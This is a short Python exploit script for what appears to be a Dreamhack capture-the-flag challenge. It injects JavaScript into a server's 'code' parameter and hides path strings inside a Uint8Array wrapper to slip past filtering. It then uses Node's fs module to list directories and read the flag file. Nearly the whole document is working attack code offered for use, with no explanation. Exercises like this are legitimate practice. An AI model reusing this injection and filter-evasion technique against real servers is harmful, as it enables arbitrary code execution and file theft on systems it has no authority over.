import requests
import re

url = "http://host3.dreamhack.games:22548/"

def run(payload):
    res = requests.get(url, params={
        'code': f'const obf = s => new Uint8Array((new TextEncoder()).encode(s).buffer); console.log({payload})'
    })

    return res.text

resp = run("require('fs').readdirSync(obf(`${__dirname}/../../`)).join(' ')")

flag_path = re.findall(r'(flag_[a-z0-9]+)', resp)[0]

flag = run("require('fs').readFileSync(obf(`${__dirname}/../../%s`)).toString()" % flag_path).strip()
print("Flag:", flag)